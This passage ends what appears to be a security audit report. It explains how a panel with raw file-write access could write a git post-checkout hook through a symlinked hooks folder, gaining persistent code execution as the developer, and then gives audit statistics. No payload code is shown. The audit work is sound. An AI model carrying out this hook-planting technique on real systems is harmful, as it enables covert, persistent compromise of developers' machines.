Chosen target (present by design in context folder):
`<context>/<repo>/.git/hooks/post-checkout`

Because `hooks/` is a symlink to `<source>/<repo>/.git/hooks/`, the
write lands in the source repo's hooks. Next `git checkout` on the
host (IDE switch branch, `git pull`, etc.) executes the script as
the developer, giving persistent RCE.

Even without F-03, if a panel can touch `.git/hooks` via any
untested side channel (e.g. future service that accepts raw paths,
or git push that updates `post-receive` for the local git server —
which runs under the same user), hook RCE is a live vector.

### 7.6 Statistics

* fsService methods: 29.
* Services exposing `panel` to unrestricted raw paths: 1 (fs).
* Services exposing `panel` to broad data APIs without additional
  authz: 2 (db, browser-data).
* SQL injection risks in server code: 0.
* Unbounded read/write primitives reachable by panel: 2
  (`fs.readFile`, `fs.writeFile`).

---

*End of report.*
